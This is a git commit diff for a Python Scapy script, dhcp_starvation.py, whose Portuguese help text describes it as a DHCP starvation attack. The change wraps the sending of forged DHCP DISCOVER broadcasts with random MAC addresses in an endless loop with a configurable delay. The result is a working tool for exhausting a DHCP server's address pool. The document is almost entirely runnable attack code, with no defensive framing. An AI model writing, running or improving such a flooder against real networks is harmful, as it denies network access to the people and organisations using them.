42d26ce22e867f6e9dff20d4ae1dbf088d6a5672
João Paulo Gomes Barbosa <joaopaulo_b2008@hotmail.com>
2024-07-14 09:34:02 -0300

    starvation

--- dhcp_starvation.py
+++ dhcp_starvation.py
@@ -1,25 +1,27 @@
 import argparse
+import time
 from scapy.all import *
 
-def dhcp_starvation(iface):
+def dhcp_starvation(iface, delay=0.1):
     conf.checkIPaddr = False 
 
-    DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
-                / IP(src='0.0.0.0', dst='255.255.255.255') \
-                / UDP(dport=67, sport=68) \
-                / BOOTP(op=1, chaddr=RandMAC()) \
-                / DHCP(options=[('message-type', 'discover'), ('end')])
+    while True:
+        DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
+                    / IP(src='0.0.0.0', dst='255.255.255.255') \
+                    / UDP(dport=67, sport=68) \
+                    / BOOTP(op=1, chaddr=RandMAC()) \
+                    / DHCP(options=[('message-type', 'discover'), ('end')])
 
-
-    sendp(DHCP_DISCOVER, iface=iface, loop=1, verbose=1)
+        sendp(DHCP_DISCOVER, iface=iface, verbose=1)
+        time.sleep(delay)  # Adiciona um atraso entre os pacotes
 
 if __name__ == "__main__":
-
     parser = argparse.ArgumentParser(description='Script para executar DHCP Starvation.')
     parser.add_argument('-i', '--interface', type=str, required=True, help='Interface de rede a ser usada para o ataque')
-    
 
     args = parser.parse_args()
     
-    dhcp_starvation(args.interface)
+    delay = 0.1  # Valor do atraso entre pacotes em segundos
+
+    dhcp_starvation(args.interface, delay)
 
